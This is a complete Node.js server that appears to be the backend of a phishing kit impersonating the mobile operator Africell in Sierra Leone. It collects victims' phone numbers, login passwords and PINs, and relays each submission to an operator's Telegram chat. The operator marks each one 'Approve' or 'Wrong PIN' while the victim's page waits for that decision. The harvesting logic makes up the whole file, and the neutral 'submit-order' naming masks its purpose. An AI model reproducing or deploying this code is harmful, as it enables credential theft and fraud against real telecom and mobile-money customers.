const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Tells Express to serve your static HTML files

// Memory pads to track user authentication states by phone number
const orderStatuses = {};   
const lastSubmissionTime = {}; 
const userCredentials = {}; // Tracks collected credentials per phone

// Helper function to safely escape Markdown special characters
function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        
        if (!data.ok) {
            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
        } else {
            console.log('✅ Message successfully delivered to Telegram!');
        }
        return data;
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('❌ Telegram Fetch Exception:', error.message);
        throw error;
    }
}

// Handles Submissions across login and PIN confirmation flows
app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 15 * 1000; // 15 seconds cooldown

        // Force status to 'pending' immediately on every new request
        orderStatuses[phone] = 'pending';

        // Bypass cooldown for PIN codes and passwords so multi-step forms never get stuck
        const isImportantAction = (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Password: ')));

        if (!isImportantAction && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[phone] = currentTime;

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';

        // Initialize or retrieve user credentials accumulator
        if (!userCredentials[phone]) {
            userCredentials[phone] = {};
        }

        let headerTitle = "🔔 *Africell Submission Update*";
        let wrongButtonText = "❌ Wrong Info";

        // Accumulate/Merge incoming data into the user's permanent session profile
        if (uniqueId && uniqueId.startsWith('PIN: ')) {
            headerTitle = "🔐 *Africell PIN Code Submitted*";
            wrongButtonText = "⚠️ Wrong PIN";
            userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
        } else if (uniqueId) {
            // Captures main login password
            userCredentials[phone].password = uniqueId;
            headerTitle = "🔑 *Africell Login Attempt*";
            wrongButtonText = "⚠️ Wrong Password";
        }

        // Build a comprehensive message displaying accumulated user info
        let message = `${headerTitle}\n\n` +
                      `${countryFlag} Country: \`+232\`\n` +
                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

        if (userCredentials[phone].mpin) {
            message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[phone].mpin)}\``;
        }
        if (userCredentials[phone].password) {
            message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[phone].password)}\``;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const encodedId = encodeURIComponent(uniqueId || 'N/A');

        const sentTelegramMsg = await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` }
                    ],
                    [
                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodedId}` }
                    ]
                ]
            }
        });

        // 5-minute timeout check for Telegram admin
        if (sentTelegramMsg && sentTelegramMsg.result) {
            const msgChatId = sentTelegramMsg.result.chat.id;
            const msgId = sentTelegramMsg.result.message_id;

            setTimeout(async () => {
                if (orderStatuses[phone] === 'pending') {
                    orderStatuses[phone] = 'expired';

                    let expiredMessage = `⌛ *Africell Request Expired / Timed Out*\n\n` +
                                         `${countryFlag} Country: \`+232\`\n` +
                                         `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
                                         `📌 Status: *Timed Out (User Left / No Admin Action)*`;

                    const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
                    try {
                        await sendToTelegram(editUrl, {
                            chat_id: msgChatId,
                            message_id: msgId,
                            text: expiredMessage,
                            parse_mode: 'Markdown'
                        });
                    } catch (err) {
                        console.error('Failed to expire Telegram message:', err.message);
                    }
                }
            }, 5 * 60 * 1000); // 5 minutes
        }

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Polling loop to check if admin approved the submission
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = orderStatuses[phone] || 'pending';
    
    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
    res.json({ status });
});

// Handles inline button clicks from Telegram admin
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let messageTitle = 'Processed Request';

            if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
                const prefix = callbackData.startsWith('approve_') ? 'approve_' : (callbackData.startsWith('reject_') ? 'reject_' : 'wrong_id_');
                const remainder = callbackData.replace(prefix, '');
                
                const lastUnderscoreIndex = remainder.lastIndexOf('_');
                if (lastUnderscoreIndex !== -1) {
                    phone = remainder.substring(0, lastUnderscoreIndex);
                }

                if (callbackData.startsWith('approve_')) {
                    orderStatuses[phone] = 'approved';
                    actionText = 'Approved ✅';
                    messageTitle = 'Africell Request Approved';
                } else if (callbackData.startsWith('reject_')) {
                    orderStatuses[phone] = 'rejected';
                    actionText = 'Rejected ❌';
                    messageTitle = 'Africell Request Rejected';
                } else if (callbackData.startsWith('wrong_id_')) {
                    orderStatuses[phone] = 'wrong_id';
                    actionText = 'Wrong Info ⚠️';
                    messageTitle = 'Africell Credential Error';
                }
            }

            const countryFlag = "🇸🇱";
            const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';

            let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                 `${countryFlag} Country: \`+232\`\n` +
                                 `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

            if (userCredentials[phone]) {
                const creds = userCredentials[phone];
                if (creds.mpin) {
                    updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
                }
                if (creds.password) {
                    updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
                }
            }

            updatedMessage += `\n\n📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl =
            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
        console.log('Webhook URL:', webhookUrl);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});